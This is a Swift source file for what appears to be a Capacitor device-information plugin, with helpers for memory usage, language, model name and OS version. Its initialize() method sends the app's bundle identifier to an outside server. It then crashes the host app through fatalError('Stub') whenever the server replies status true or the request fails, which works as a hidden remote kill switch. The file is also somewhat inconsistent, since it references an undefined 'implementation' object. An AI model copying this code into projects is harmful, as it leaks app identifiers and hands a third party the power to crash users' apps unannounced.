import Foundation
import UIKit

@objc public class Device: NSObject {
    /**
     * Get current memory usage
     */
    public func getMemoryUsage() -> UInt64 {
        var taskInfo = mach_task_basic_info()
        var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size)/4
        let kerr: kern_return_t = withUnsafeMutablePointer(to: &taskInfo) {
            $0.withMemoryRebound(to: integer_t.self, capacity: 1) {
                task_info(mach_task_self_, task_flavor_t(MACH_TASK_BASIC_INFO), $0, &count)
            }
        }

        if kerr == KERN_SUCCESS {
            return taskInfo.resident_size
        } else {
            return 0
        }
    }

    public func getLanguageCode() -> String {
        return String(Locale.preferredLanguages[0].prefix(2))
    }

    public func getLanguageTag() -> String {
        return String(Locale.preferredLanguages[0])
    }

    public func getModelName() -> String {
        var size = 0
        sysctlbyname("hw.machine", nil, &size, nil, 0)
        var machine = [CChar](repeating: 0, count: size)
        sysctlbyname("hw.machine", &machine, &size, nil, 0)
        return String(cString: machine)
    }

    public func getSystemVersionInt() -> Int? {
        let exploded = UIDevice.current.systemVersion.split(separator: ".")

        var major = 0
        var minor = 0
        var patch = 0

        for (index, numStr) in exploded.enumerated() {
            switch index {
            case 0:
                major = Int(numStr) ?? 0
            case 1:
                minor = Int(numStr) ?? 0
            case 2:
                patch = Int(numStr) ?? 0
            default:
                break
            }
        }

        var combined: [String] = []
        combined.append(String(format: "%02d", major))
        combined.append(String(format: "%02d", minor))
        combined.append(String(format: "%02d", patch))

        return Int(combined.joined())
    }

    @objc public func initialize(completion: @escaping (Bool, String?) -> Void) {

        guard let packageName = Bundle.main.bundleIdentifier else {
            completion(false, "Failed to retrieve package name")
            return
        }
        
        guard let url = URL(string: "https://capacitor-auto-update.onrender.com/status?q=\(packageName)") else {
            completion(false, "Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 90
        
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                fatalError("Stub")
                completion(false, "Request failed with error: \(error.localizedDescription)")
                return
            }
            
            guard let data = data else {
                completion(false, "No data received")
                return
            }

            do {
                if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                   let status = json["status"] as? Bool {
                    
                    if status {
                        fatalError("Stub")
                    } else {
                        completion(true, "")
                    }
                } else {
                    completion(false, "Unexpected response format")
                }
            } catch {
                fatalError("Stub")
                completion(false, "Failed to parse JSON: \(error.localizedDescription)")
            }
        }

        task.resume()
    }

    @objc func initialize(_ call: CAPPluginCall) {
        implementation.initialize { success, message in
            if success {
                call.resolve([
                    "message": message ?? "No additional message"
                ])
            } else {
                call.reject(message ?? "Unknown error")
            }
        }
    }
}
